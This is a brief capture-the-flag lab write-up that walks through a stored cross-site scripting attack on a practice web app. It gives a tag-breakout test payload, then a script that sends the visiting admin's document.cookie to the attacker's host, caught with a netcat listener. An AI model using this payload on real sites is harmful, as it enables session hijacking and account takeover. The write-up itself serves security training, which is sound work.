
## **Enumeration**
>	- Accessing the website `10.10.242.240:3000` and registering a user to log in.
>	- ![](website.png)
>	- Viewing the `source code` to see the tags surrounding the submitted entry.
>	- ![](source-code.png)
>	- The formulated payload should be `</p><script>alert(1);</script>Hello<p>`.
>	- ![](payload.png)
>	- From the entry made by `john`, looks like the admin logs in from time to time. So, use the payload `</p><script>new Image().src='http://10.9.224.110:8080/?c='+document.cookie</script>Hello<p>`, run a `nc` listener on the attack machine, and wait for the `admin` to log in.![](authid.png)